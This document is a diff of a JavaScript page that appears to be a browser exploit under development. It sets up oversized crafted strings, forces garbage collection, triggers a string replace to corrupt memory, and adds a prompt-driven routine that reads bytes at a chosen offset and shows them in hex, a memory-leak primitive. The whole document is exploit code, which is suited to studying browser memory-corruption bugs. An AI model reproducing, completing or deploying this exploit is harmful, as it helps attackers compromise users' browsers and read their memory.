@@ -1,67 +1,123 @@
 <script>
-alert("start");
-var array=new Array(0x4000);
-function neuter(ab) {
-    postMessage("", "*", [ab]);
-}
-    /*
-function gc() {
-    try {
-        var c = document.createElement("canvas");
-        var gl = c.getContext("2d");
 
-        for (var i = 0; i < 0x218; i++) {
-            var ggg = gl.createImageData(1, 0x200)
+alert("start5");
+function neuter(ab) {
+
+    postMessage("", "*", [ab]);
+
+}
+
+function gc() {
+
+    try {
+
+
+
+
+        for (var i = 0; i < 0x2000; i++) {
+
+            var gggg =new Array(0x100);
+
         }
+
     } catch (e) {
 
+
+
     }
+
 }
+
 function createStringWithRepeatedChar(c, multiplicity) {
+
     while (c.length < multiplicity)
+
         c += c;
+
     return c;
+
 }
+
 var x = "1";
-var y="";
-var tmp="";
 
-var mystr1=createStringWithRepeatedChar("M",(1<<16));
-var mystr2=createStringWithRepeatedChar("N",(1<<16));
+var y = "\u8888";
 
-for(var i=0;i<0x14;i++){
-tmp+="\u0000\u63a8";
+var tmpy="";
+
+for(var i=0;i<0x50;i++){
+
+    tmpy+="\u0000";
+
 }
-for(var i=0;i<0x28;i++){
-tmp+="\u0000";
-}
-var tmpy = createStringWithRepeatedChar("\u0000",(1 << 16) );
+
+var array=new Array(0x100);
+
+var mystr=createStringWithRepeatedChar("M",(1 << 16) );
+
+y = createStringWithRepeatedChar(y,(1 << 16) );
+
 x = createStringWithRepeatedChar(x, 1 << 16);
+
 x+="1";
-y=tmp+tmpy.substring(0,0x10000-0x50);
+
+y=tmpy+y.substring(0,y.length-0x50);
+
 x.substring(0,5);
-mystr1.substring(0,5);
-mystr2.substring(0,5);
+mystr.substring(0,5);
+
 y.substring(0,5);
-mystr1=0;
+mystr=0;
+myfunc();
 /* for(var i=0;i<array.length;i++){
+
 array[i] =createStringWithRepeatedChar("M", 1 << 12);
+
 array[i].substr(0,5);
 
+
+
 }
+
 for(var i=0;i<array.length;i++){
+
 if(i%2){
+
 array[i]=0;
+
 }
+
 }*/
+
 function myfunc(){
+
 //alert("to trigger");
+
 gc();
-eval("x.replace(/\\d/g, y)");
+
+x.replace(/\d/g, y);
+
 alert("ok");
-alert(mystr2.charCodeAt(0).toString(16));
-alert("end");
+
+var a=prompt("addr");
+
+a=a/2;
+
+var b;
+
+for(var i=0;i<0x8;i++){
+
+ b+=y.charCodeAt(a+i).toString(16);
+
+ b+=" ";
+
 }
-setTimeout(myfunc,6000);
-    */
+
+alert(b);
+
+alert("end");
+
+}
+
+//setTimeout(myfunc,10000);
+
 </script>
